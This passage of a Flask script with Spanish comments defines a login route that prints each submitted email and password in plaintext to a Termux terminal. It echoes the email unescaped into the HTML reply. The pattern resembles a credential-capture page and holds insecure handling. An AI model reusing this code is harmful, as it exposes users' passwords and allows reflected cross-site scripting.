# NUEVA RUTA: Aquí procesamos la información que envía el usuario
@app.route("/login", methods=["POST"])
def login():
    # Recibimos lo que escribió el usuario en las casillas (usando el 'name' de cada input)
    correo_ingresado = request.form.get("correo")
    clave_ingresada = request.form.get("password")

    # Imprimimos los datos EN LA TERMINAL de Termux
    print("=" * 30)
    print(f"¡NUEVO LOGIN RECIBIDO!")
    print(f"Correo: {correo_ingresado}")
    print(f"Contraseña: {clave_ingresada}")
    print("=" * 30)

    # Le respondemos algo sencillo al navegador
    return f"<h1>¡Datos recibidos con éxito!</h1><p>Bienvenido: {correo_ingresado}</p><a href='/'>Volver</a>"


if __name__ == "__main__":
